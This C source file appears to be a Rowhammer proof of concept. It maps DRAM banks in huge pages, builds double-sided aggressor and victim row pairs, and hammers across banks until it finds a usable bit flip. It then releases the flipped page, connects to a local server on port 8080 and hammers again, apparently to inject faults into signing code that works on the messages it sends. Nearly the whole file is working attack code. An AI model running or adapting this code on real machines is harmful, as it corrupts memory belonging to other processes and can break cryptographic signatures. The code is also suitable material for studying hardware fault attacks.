#include "rowhammer_utils.h"
#define _GNU_SOURCE
#include <sys/mman.h>
#define ROW_CONFLICT_TH 470



// #include "allocator.h"
// #include "include/params.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <assert.h>
#include <string.h>

#include <sys/socket.h> 
#include <sys/types.h> 
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/sysinfo.h>
#include <sys/stat.h>

#include "params.h"

// #include "utils.h"
#define POSIX_ALIGN (1<<22)
#define MEM_SIZE (1<<21)
#define HUGE_SIZE (1<<21)

#define HASH_FN_CNT 4
#define ROW_SIZE 		(1<<13)

typedef struct {
	uint64_t lst[HASH_FN_CNT];
	uint64_t len;
}AddrFns;

typedef struct {
	AddrFns h_fns;
	uint64_t row_mask;
	uint64_t col_mask;
}DRAMLayout;


typedef struct{
    uint64_t num_conf;
    char** conflicts;
}contig_rows;

typedef struct {
   char* base;
   contig_rows* bank_contig_rows; // array of conflict array (e.g. conflict_bank[0] is an array of all the addresses that conflict in bank 0. Each 4 addresses in that row will belong to a single row)
   uint64_t virt_offset; // the virtual addr offset from eg. a virtual address that thas 21 trailing zeroes has a virtual offset of 0. Helps with virt2dram but not abs necessary
}contig_chunk;

typedef struct{
    char* aggressors[8];
    char* victims[4];
}ds_pair; // this struct will hold all the relevant base addresses for a double-sided hammer

typedef struct{
    ds_pair* pairs[16];
    int num_pairs[16]; 
}bank_pairs;

typedef struct{
    char** addresses[16];
    int num_addr[16]; 
}contiguous_bank;

contiguous_bank bank_rows;

bank_pairs bank_pairs_arr;

DRAMLayout      g_mem_layout = {{{0x2040,0x24000,0x48000,0x90000}, 4}, 0x3fffe0000, ROW_SIZE-1};

char** agg;
int prehammer_val=0;
char* tgt_page=0;


int num_blocks = 2;
// only works with 2MB aligned pages because the first 21 bits of the virtual addresses are identical to the first in phys
u_int64_t get_bank(uint64_t v_addr){
    
    uint64_t bank=0;
    for (int i = 0; i < g_mem_layout.h_fns.len; i++) {
		
		bank |= (__builtin_parityl(v_addr & g_mem_layout.h_fns.lst[i]) <<i);
	}
    return bank;
}

///thp code 
uint64_t get_dram_row_thp(uint64_t v_addr)
{
	uint64_t row_mask = (HUGE_SIZE -1) & g_mem_layout.row_mask;
	return (v_addr & row_mask) >> __builtin_ctzl(row_mask);
}

int alloc_buffer(contig_chunk* mem_chunks, int num_blocks)
{
	


	// madvise alloc
	for (int i = 0; i < num_blocks; i++) {
		posix_memalign((void **)(&(mem_chunks[i].base)), POSIX_ALIGN, MEM_SIZE);
        
        if (mem_chunks[i].base == NULL) {
		    fprintf(stderr, "not alloc\n");
	    }
		//fprintf(stderr, "iter %d: ", i);
		if (madvise(mem_chunks[i].base, POSIX_ALIGN, MADV_HUGEPAGE) == -1)
		{
			fprintf(stderr, "MADV %d Failed: %d\n", i, errno);
            if(errno == ENOMEM){
                fprintf(stderr, "no mem");
            }
		}
		
        memset(mem_chunks[i].base,0xFF,MEM_SIZE);

        mem_chunks[i].virt_offset = ((uint64_t) mem_chunks[i].base) & (MEM_SIZE - 1);
	}

	return 0;

}

// finds all pages that row conflict with the base_page
void find_bank_conflict(contig_chunk* mem_chunk, int target_bank){

    // find a base address in the target bank
    
    u_int64_t base;
    u_int64_t curr;
    uint64_t phys;
    int ndx=0;
    for(int i=0; i< MEM_SIZE/PAGE_SIZE; i++){
        int found_base=0;
        for(int j=0; j<2; j++){
            base = (uint64_t)mem_chunk->base + i*PAGE_SIZE + 64*j;
            if(get_bank(base) == target_bank){
                
                found_base=1;
                break;
            }
        }
        if(found_base){break;}
    }
    mem_chunk->bank_contig_rows[target_bank].conflicts = (char**) malloc(sizeof(char*) * 300);
    
    

 
   
  
    for(int i=0; i<MEM_SIZE/PAGE_SIZE; i++){
        for (int v=0; v< 2; v++){
            curr = (uint64_t) mem_chunk->base + (i*PAGE_SIZE) + 64*v;
            if(curr == base){continue;}
            
            
            if(get_bank(base) == get_bank(curr)){
                mem_chunk->bank_contig_rows[target_bank].conflicts[ndx] = (char*)curr;
                // printf("Get DRAM row: %lx\n",get_dram_row_thp((u_int64_t)curr));
                // printf("Get BANK: %lx\n",get_bank((u_int64_t)curr));
                ndx++;
            }
        }

        // if(ndx >=100){break;}
        

    }
    // free(dram);
    // if(ndx < 100){printf("less than 100 found\n"); exit(0);}
    mem_chunk->bank_contig_rows[target_bank].num_conf =ndx;
    return ;
}






// takes in all the memory chunks and returns a pointer to a list of hammering pairs
// the list is to be used in templating
// so this function is just for organizing things
int create_hammer_pairs(contig_chunk* chunks, int target_bank, ds_pair* pairs_array){
    // ds_pair* pairs_array = (ds_pair*) malloc(200*sizeof(ds_pair));
    int pair_ndx=0;

    for(int i=0; i< num_blocks; i++){ // go through the conflict array of the target bank of each chunk. The conflict array is basically a list of contig memory rows
        if(chunks[i].bank_contig_rows[target_bank].num_conf < 12){continue;} // if the chunk doesn't have a full 3 rows for double sided, skip it
        int ndx=0;
        int agg_parity=0;
        while((ndx*4) <= chunks[i].bank_contig_rows[target_bank].num_conf  -4){
            if((ndx%2) == 0){
                // aggressors
                pairs_array[pair_ndx].aggressors[0 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].aggressors[1 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].aggressors[2 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].aggressors[3 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];

                if(agg_parity == 1){
                    // completed an agg pair
                    pair_ndx++;
                }
                agg_parity = agg_parity ^ 1;

            }else{
                pairs_array[pair_ndx].victims[0] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].victims[1] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].victims[2] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].victims[3] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];
            }
            ndx++;
        }
        
    }
    
    return pair_ndx;
}



void fill_victims(ds_pair* pairs_array, int num_pairs){
    for(int i=0; i< num_pairs; i++){
        char* addr =  (char*) (((uint64_t)  pairs_array[i].victims[0])  &(~(PAGE_SIZE-1)) );
        char* addr2 = (char*) (((uint64_t)  pairs_array[i].victims[1])  &(~(PAGE_SIZE-1)) );
        char* addr3 = (char*) (((uint64_t)  pairs_array[i].victims[2])  &(~(PAGE_SIZE-1)) );
        char* addr4 = (char*) (((uint64_t)  pairs_array[i].victims[3])  &(~(PAGE_SIZE-1)) );
        memset(addr, 0x00, PAGE_SIZE);
        memset(addr2, 0x00, PAGE_SIZE);
        memset(addr3, 0x00, PAGE_SIZE);
        memset(addr4, 0x00, PAGE_SIZE);
        flush_chunck(addr,PAGE_SIZE);
        flush_chunck(addr2,PAGE_SIZE);
        flush_chunck(addr3,PAGE_SIZE);
        flush_chunck(addr4,PAGE_SIZE);
    }
    return;
}




int check_victims(ds_pair* pairs_array, int num_pairs, uint8_t expected){
    for(int i=0; i< num_pairs; i++){
        for(int j=0; j < 4; j++){
            char* addr = (char*) (((uint64_t) pairs_array[i].victims[j]) &(~(PAGE_SIZE-1)) );
        
            int flip=0;
            int bad=0;
            int num_flips=0;
            for(int n=0; n<PAGE_SIZE; n++){
                if((uint8_t) addr[n] != expected ){
                    printf("FLIP in addr (%lx): %hhx\n",(u_int64_t)(addr + n), addr[n]);
                    num_flips++;
                    if(n<=31){
                      flip=1;
                    }else{bad=1;}
             
                }
                
            }

            // if(num_flips>0){
            //   tgt_page=addr;
            //     return 1;   
            // }

            if(flip & (!bad)){
                tgt_page=addr;
                return 1;
            }
        }   
    }
    return 0 ;

}





int multi_bank(){
    char** agg_list = malloc(20*sizeof(char*));
   for(int bank1=0; bank1<16; bank1++){
       for(int bank2=(bank1+1); bank2<16; bank2++){
           int bank1_start=0;
           int bank2_start=0;
           int bank1_end=0;
           int bank2_end=0;
           int ndx=0;
           while((bank1_end < bank_pairs_arr.num_pairs[bank1]) &&  (bank2_end < bank_pairs_arr.num_pairs[bank2])){
            //    agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
            //    agg_list[ndx+2] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
            //    agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               
               agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
                agg_list[ndx+1] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
               agg_list[ndx+2] =  bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
               agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               ndx+=4;
               bank1_end++;
               bank2_end++;
               if(ndx>=20){
                //    printf("%d  aggressors\n", ndx);
                //    for(int i=0; i<ndx; i++){
                       
                //        printf("Bank %ld:\n", get_bank((u_int64_t) agg_list[i]));
                //     }
                   // fill the victims
                   fill_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1]);
                   fill_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2]);
                   // hammer
                    int x =  hammer_thp_prehammer(agg_list, 0, 20);
                   // scan the victims
                   if(check_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1], 0x00)){
                       agg  = agg_list;
                       return 1;
                   }
                   if(check_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2], 0x00)){
                       agg  = agg_list;
                       return 1;
                   }
                   
                   
                  // reset
                  ndx=0;
                  bank1_end = bank1_start+3;
                  bank1_start+=3;
                  bank2_end = bank2_start+3;
                  bank2_start+=3;
               }

           }
       }
   }
   return 0;
}



void main(void){

    


   
    contig_chunk* chunks = malloc( num_blocks* sizeof(contig_chunk));
    
    for(int i=0; i<num_blocks; i++){
        chunks[i].bank_contig_rows = malloc(16*sizeof(contig_rows));
    }

    

    /// madvise memory///////////////////////////
    int alloc = alloc_buffer(chunks, num_blocks);
  

    

    ///////////////////////////////////

    
    // exit(0);

    

    // For every bank, for every chunk, create a list of contiguous rows 
    
    int tries = 0;
    while(tries < 10){
        for(int j=0; j < 16; j++){
            ds_pair* pairs_array = (ds_pair*) malloc(200*sizeof(ds_pair));
            // printf("//////////////////////Conflict for Bank %d////////////////////////////\n", j);
            for(int i=0; i < num_blocks; i++){
                // printf("-------------Chunk %d------------------------\n", i);
                find_bank_conflict(&chunks[i], j);
            }
            // printf("//////////////////////Create Pairs.....................\n");
            int num_pairs = create_hammer_pairs(chunks, j, pairs_array); //create a liist of double sided pairs
            bank_pairs_arr.pairs[j] = pairs_array;
            bank_pairs_arr.num_pairs[j] = num_pairs;
            // int flippy = ten_sided_temp(pairs_array, num_pairs);
        }
        // setup_bank_rows(chunks);
        if(multi_bank()){
            break;
        }
        alloc = alloc_buffer(chunks, num_blocks);
    
        for(int i=0; i<num_blocks; i++){
            chunks[i].bank_contig_rows = malloc(16*sizeof(contig_rows));
        }
        
        tries++;
    }
    if(!tgt_page){
        printf("no suitable flips...\n");
        exit(0);
    }
    
    
    // load the message
    uint8_t m[MLEN*SIGNUM];
    FILE *msg_file = fopen("./messages/all_messages.bin","r");
    fread(m,sizeof(uint8_t),MLEN*SIGNUM,msg_file);
    fclose(msg_file);

    
    
    // connect
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    int skt;
    socklen_t addrlen = sizeof(addr);

    if((skt = socket(AF_INET, SOCK_STREAM, 0))<0){
        printf("socket error\n");
        exit(0);
    }
    int ret = inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    

    // munmap(mem,PAGE_SIZE);
    // for(int i=0; i<dummy_num; i+=2){
    //     munmap(dummy + i*PAGE_SIZE,PAGE_SIZE);
    // }
     for(int i=0; i< num_blocks; i++){
        int m = madvise(chunks[i].base, PAGE_SIZE, MADV_PAGEOUT);
    }
    munmap(tgt_page,PAGE_SIZE);


    ret = connect(skt,(struct sockaddr*)&addr,addrlen);
    printf("Connected to the server\n");
    
    usleep(4000);
    // hammer
    for (int i=0; i< 20; i++){
        int t =  hammer_thp_prehammer(agg, 0, 20);
    }
    
    // send
    send(skt,m,MLEN*SIGNUM,0);
    

    

    
}